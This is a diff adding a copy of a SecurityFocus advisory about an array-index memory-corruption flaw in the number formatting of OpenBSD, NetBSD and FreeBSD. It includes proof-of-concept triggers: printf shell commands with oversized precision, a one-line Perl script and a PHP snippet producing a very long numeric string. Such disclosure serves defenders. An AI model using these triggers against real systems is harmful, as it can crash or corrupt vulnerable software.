@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/35510/info
+
+Multiple BSD distributions are prone to a memory-corruption vulnerability because the software fails to properly bounds-check data used as an array index.
+
+Attackers may exploit this issue to execute arbitrary code within the context of affected applications.
+
+The following are vulnerable:
+
+OpenBSD 4.5
+NetBSD 5.0
+FreeBSD 6.4 and 7.2
+
+Other software based on the BSD code base may also be affected. 
+
+The following proof-of-concept shell commands are available:
+
+printf %1.262159f 1.1
+printf %11.2109999999f
+printf %11.2009999999f
+printf %11.2009999999f
+
+The following proof-of-concept Perl script is available:
+
+#!/usr/local/bin/perl
+printf "%0.4194310f", 0x0.0x41414141;
+
+The following proof-of-concept J program is available:
+
+cxib=0.<?php echo str_repeat("1",296450); ?> 
